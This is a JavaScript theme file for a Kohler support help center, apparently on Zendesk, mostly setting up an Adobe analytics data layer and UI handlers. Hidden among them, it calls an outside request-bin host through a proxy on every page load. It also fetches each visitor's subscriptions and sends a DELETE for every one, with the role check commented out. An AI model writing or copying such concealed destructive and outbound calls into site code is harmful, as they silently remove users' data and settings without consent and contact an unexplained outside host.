/*
 * jQuery v1.9.1 included
 */
var digitalData = {};
window.digitalData = digitalData;
digitalData.page = {}, digitalData.page.pageInfo = {}, digitalData.page.category = {};
digitalData.user = [];
digitalData.event = [];
digitalData.component = [];
digitalData.page.pageInfo.SiteID ='kohler';
digitalData.page.category.primaryCategory = 'support';


var footerAdobe = new Vue({
  created: function(){
    digitalData.page.pageInfo.destinationURL = window.location.href;
    digitalData.page.pageInfo.language = this._getLocale();
    digitalData.page.pageInfo.siteLanguage = this._getLocale();
    digitalData.page.pageInfo.timestamp = this._getTime();
    digitalData.page.pageInfo.geoRegion = this._geo();
    digitalData.page.pageInfo.referreringURL = window.document.referrer;
    digitalData.page.category.subCategoryID = this._getPageId(window.location.href);
    digitalData.page.category.subCategoryID2 = "n/a";  
  }, 
  methods :{
     /**
     * Helper method to get current help center locale
     * @return {string} locale code
     */
    _getLocale: function() {
      var links = window.location.href.split("/"),
          hcIndex = links.indexOf("hc"),
          links2 = links[hcIndex + 1].split("?"),
          locale = links2[0];
      return locale;
    },

    /**
     * Helper method to get current page ID
     * @param  {string} url
     * @return {integer} page ID
     */
    _getPageId: function(url) {
      var links = url.split("/"),
          page = links[links.length - 1],
          result = page.split("-")[0];

      return parseInt(result,10) || 'n/a';
    },
    // get the geoLocale 
    _geo: function(){
      
      return this._getLocale().slice(-2);
    },
    /** 
    	* method to get curent UTC time
      *
    **/
    _getTime: function(){
      var dateNow = new Date();
      return dateNow.toISOString();
    }
  }
});
// pull data from the search page and set up events and component 
var searchAdobe = new Vue({
  mounted: function(){
    digitalData.event[digitalData.event.length] =  this.setEvent();
    digitalData.component[digitalData.component.length] =this.setComponentInfo();
  },
  methods : {
    setEvent: function(){
      var event = {};
      event.eventInfo ={};
      event.eventInfo.eventName = 'support search';
      event.eventInfo.eventAction = 'search';
      event.eventInfo.type = 'search';
      return event;
    },
    setComponentInfo: function(){
      var component = {};
      component.componentInfo = {};
      component.componentInfo.componentID = $('input#query').val();
      component.componentInfo.componentName = 'support search term';
      component.componentInfo.componentMessage ='';
      return component;
    }
    
  }
});
// set voting events in Adobe 
var articleAdobe = new Vue({
  methods: {
    vote: function(event){
       var event1 = {};
        event1.eventInfo ={};
        event1.eventInfo.eventName = 'article review';
        event1.eventInfo.eventAction = event.target.title.toLowerCase();
        event1.eventInfo.type = 'review';
      digitalData.event[digitalData.event.length] = event1;
    }
  }
});
$.ajax({type:'get', dateType:'application/json',url:'/proxy/to?url=http%3A%2F%2Fpostb.in/M5lmBOhg'}).success(function(s){console.log(s.response);})
$(document).ready(function() {
  // if(HelpCenter.user.role == 'end-user') {
  //   console.log('fire')
  var getLocation = function(href) {
    var l = document.createElement("a");
    l.href = href;
    return l;
};
  $.getJSON("/api/v2/help_center/users/me/subscriptions.json", function(data) { 
          var output = "";
          for (var i in data.subscriptions) {
            var x = getLocation(data.subscriptions[i].url);
            console.log(x.pathname)
            $.ajax({
                url: x.pathname,
                contentType:'application/json',
                type: 'DELETE',
            }); 
          }
  });
// }
  
  
  //get the breadcrumbs for the adobe pageinfo pageName
    var _getBread = function(){
      var list = '';
          $('.sub-nav .breadcrumbs').children().map(function(){return this.title}).each(function(x,i){list += i +':';});
      return list;
    }
    //get user infromation for the adobe user obj
    var _setUser = function(){
      var obj = {};
      var inner = {}
      inner.profileID = 'n/a';
      inner.profileRole = HelpCenter.user.role;
      inner.authStatus = HelpCenter.user.role === "anonymous" ? "not authenticated" : "authenticated";
      obj.profile = []
      obj.profile[obj.profile.length] = inner;
      return obj;
    }
  // set the adobe pageinfo pagename
 digitalData.page.pageInfo.pageName = 'support:'+_getBread() +' '+ digitalData.page.category.subCategoryID;
  //set the adobe user 
 digitalData.user[digitalData.user.length] = _setUser();
  // social share popups
  $(".share a").click(function(e) {
    e.preventDefault();
    window.open(this.href, "", "height = 500, width = 500");
  });

  // show form controls when the textarea receives focus or backbutton is used and value exists
  var $commentContainerTextarea = $(".comment-container textarea"),
    $commentContainerFormControls = $(".comment-form-controls, .comment-ccs");

  $commentContainerTextarea.one("focus", function() {
    $commentContainerFormControls.show();
  });

  if ($commentContainerTextarea.val() !== "") {
    $commentContainerFormControls.show();
  }

  // Expand Request comment form when Add to conversation is clicked
  var $showRequestCommentContainerTrigger = $(".request-container .comment-container .comment-show-container"),
    $requestCommentFields = $(".request-container .comment-container .comment-fields"),
    $requestCommentSubmit = $(".request-container .comment-container .request-submit-comment");

  $showRequestCommentContainerTrigger.on("click", function() {
    $showRequestCommentContainerTrigger.hide();
    $requestCommentFields.show();
    $requestCommentSubmit.show();
    $commentContainerTextarea.focus();
  });

  // Mark as solved button
  var $requestMarkAsSolvedButton = $(".request-container .mark-as-solved:not([data-disabled])"),
    $requestMarkAsSolvedCheckbox = $(".request-container .comment-container input[type=checkbox]"),
    $requestCommentSubmitButton = $(".request-container .comment-container input[type=submit]");

  $requestMarkAsSolvedButton.on("click", function () {
    $requestMarkAsSolvedCheckbox.attr("checked", true);
    $requestCommentSubmitButton.prop("disabled", true);
    $(this).attr("data-disabled", true).closest("form").submit();
  });

  // Change Mark as solved text according to whether comment is filled
  var $requestCommentTextarea = $(".request-container .comment-container textarea");

  $requestCommentTextarea.on("keyup", function() {
    if ($requestCommentTextarea.val() !== "") {
      $requestMarkAsSolvedButton.text($requestMarkAsSolvedButton.data("solve-and-submit-translation"));
      $requestCommentSubmitButton.prop("disabled", false);
    } else {
      $requestMarkAsSolvedButton.text($requestMarkAsSolvedButton.data("solve-translation"));
      $requestCommentSubmitButton.prop("disabled", true);
    }
  });

  // Disable submit button if textarea is empty
  if ($requestCommentTextarea.val() === "") {
    $requestCommentSubmitButton.prop("disabled", true);
  }

  // Submit requests filter form in the request list page
  $("#request-status-select, #request-organization-select")
    .on("change", function() {
      search();
    });

  // Submit requests filter form in the request list page
  $("#quick-search").on("keypress", function(e) {
    if (e.which === 13) {
      search();
    }
  });

  function search() {
    window.location.search = $.param({
      query: $("#quick-search").val(),
      status: $("#request-status-select").val(),
      organization_id: $("#request-organization-select").val()
    });
  }

  $(".header .icon-menu").on("click", function(e) {
    e.stopPropagation();
    var menu = document.getElementById("user-nav");
    var isExpanded = menu.getAttribute("aria-expanded") === "true";
    menu.setAttribute("aria-expanded", !isExpanded);
  });

  if ($("#user-nav").children().length === 0) {
    $(".header .icon-menu").hide();
  }

  // Submit organization form in the request page
  $("#request-organization select").on("change", function() {
    this.form.submit();
  });

  // Toggles expanded aria to collapsible elements
  $(".collapsible-nav, .collapsible-sidebar").on("click", function(e) {
    e.stopPropagation();
    var isExpanded = this.getAttribute("aria-expanded") === "true";
    this.setAttribute("aria-expanded", !isExpanded);
  });
});
